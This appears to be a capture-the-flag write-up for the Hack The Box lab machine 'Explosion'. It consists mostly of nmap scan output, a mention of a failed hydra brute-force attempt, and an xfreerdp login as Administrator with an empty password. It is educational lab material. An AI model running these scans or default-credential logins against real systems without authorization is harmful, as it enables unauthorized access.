---
layout: post
title: explosion
categories: htb
tags:
- htb
- starting_point
- explosion
- xfreerdp
author: nicoliboli
description: starting point | tier 0 | box 4
date: '2025-06-16 13:37:35 -0400'
---
# enumeration

```
$ nmap 10.129.182.134            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 13:05 EDT
Nmap scan report for 10.129.182.134
Host is up (0.096s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds

$ nmap -sC -sV -p 135,139,445,3389 10.129.182.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 13:06 EDT
Nmap scan report for 10.129.182.134
Host is up (0.099s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-16T17:07:09+00:00
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2025-06-15T17:05:26
|_Not valid after:  2025-12-15T17:05:26
|_ssl-date: 2025-06-16T17:07:17+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-16T17:07:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.36 seconds

$ nmap -p- -T5 10.129.182.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 13:06 EDT
Warning: 10.129.182.134 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.182.134
Host is up (0.098s latency).
Not shown: 63631 closed tcp ports (conn-refused), 1890 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 496.71 seconds

$ sudo nmap -sC -sV -O -p 135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.182.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 13:16 EDT
Nmap scan report for 10.129.182.134
Host is up (0.096s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-16T17:17:27+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2025-06-15T17:05:26
|_Not valid after:  2025-12-15T17:05:26
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-16T17:17:18+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2019|2012|10|2022|2008|7|2016|Vista|Longhorn (95%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_vista::sp1:home_premium cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2022 (91%), Microsoft Windows 10 1709 - 1909 (87%), Microsoft Windows Server 2012 (87%), Microsoft Windows Server 2012 or Server 2012 R2 (87%), Microsoft Windows 10 1703 (86%), Microsoft Windows Server 2008 R2 (86%), Microsoft Windows 7 SP1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-16T17:17:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.70 seconds
```

## port 3389 - rdp

tried hydra, but wasn't getting a promising result. 

![hydra_error](/assets/img/hydra_error.png)

# exploitation

instead i thought to try well-known Windows user accounts and got it on the first try.

```
$ xfreerdp /u:Administrator /v:10.129.182.134
[13:23:20:867] [11881:11882] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:23:20:867] [11881:11882] [WARN][com.freerdp.crypto] - CN = Explosion
Password: 
[13:23:23:413] [11881:11882] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:23:23:413] [11881:11882] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:23:23:485] [11881:11882] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:23:23:487] [11881:11882] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:23:25:103] [11881:11882] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

![explosion_flag](/assets/img/explosion_flag.png)